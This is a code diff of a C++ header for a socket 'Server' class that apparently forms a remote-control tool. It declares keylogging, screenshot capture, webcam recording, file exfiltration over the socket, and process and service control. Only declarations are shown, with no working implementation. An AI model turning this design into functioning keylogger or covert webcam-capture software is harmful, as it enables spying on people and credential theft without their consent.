@@ -15,6 +15,15 @@
 #include <vector>
 #include <cstdint>
 #include <sstream>
+#include <opencv2/opencv.hpp>
+#include <ws2tcpip.h>
+#include <thread>
+#include <mutex>
+#include <condition_variable>
+#include <atomic>
+#include <vector>
+#include <cstdint>
+#include <sstream>
 #include <map> //using for keyLogger
 #include <thread> //using for keyLogger
 #include <mutex> //using for keyLogger
@@ -32,8 +41,10 @@
 #define NO_ERROR 0
 #endif
 
-using namespace Gdiplus;
 #pragma comment (lib,"gdiplus.lib")
+
+using namespace Gdiplus;
+
 
 
 
@@ -43,6 +54,12 @@ public:
     ~Server();
     bool start();
     void listenForConnections();
+    void shutdownServer();
+    void restartServer();
+    void readKey(int, SOCKET);
+    void keyLogger(SOCKET);
+
+
 private:
     int port;
     SOCKET listenSocket; 
@@ -69,6 +86,12 @@ private:
     void closeProcess(const int processID, SOCKET clientSocket);
     //List/Turn on/Turn off services
     void listServices(SOCKET);
+    bool captureScreenshot(cv::Mat& outImage);
+    bool captureAndSendScreenshot(SOCKET clientSocket);
+    void copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName);
+    void openWebcam(SOCKET clientSocket);
+    void startRecording(cv::VideoCapture& webcam, SOCKET clientSocket);
+    void stopRecording(SOCKET clientSocket);
 };
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
